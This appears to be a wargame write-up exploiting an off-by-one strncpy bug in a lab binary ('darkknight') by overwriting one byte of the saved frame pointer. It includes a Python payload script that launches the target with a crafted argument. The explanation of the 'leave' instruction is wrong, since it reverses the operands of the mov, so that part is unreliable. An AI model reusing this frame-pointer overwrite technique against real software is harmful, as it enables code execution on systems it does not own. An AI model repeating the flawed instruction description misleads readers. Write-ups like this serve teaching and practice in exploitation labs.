# Vulnerability
```c
void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}
```
This program uses strncpy that checks length but there is a mistake.

buffer is 40 bytes but it makes me able to copy 41 bytes.

I can overwrite only 1 byte on SFP but it is enought to exploit.

# Exploitation
The buffer is like:
```
--------------------------------
| buffer[40] | SFP[4] | RET[4] |
--------------------------------
```
I will use leave & ret to exploit this program.

In leave:
```assembly
mov ebp, esp
pop ebp
```
ESP will contain [SFP's address + 4].

and in ret:
```assembly
pop eip
```

In conclusion, If I give buffer's address and give shellcode's address in buffer+4, this program will have that address in EIP after leave & ret.

# Payload
```python
import os

payload = ""
payload = payload + "AAAA"
payload = payload + "\x7a\xfe\xff\xbf"
payload = payload + "A"*32
payload = payload + "\x14" # SFP

os.execv("/home/golem/darkknight", ["", payload]);
```
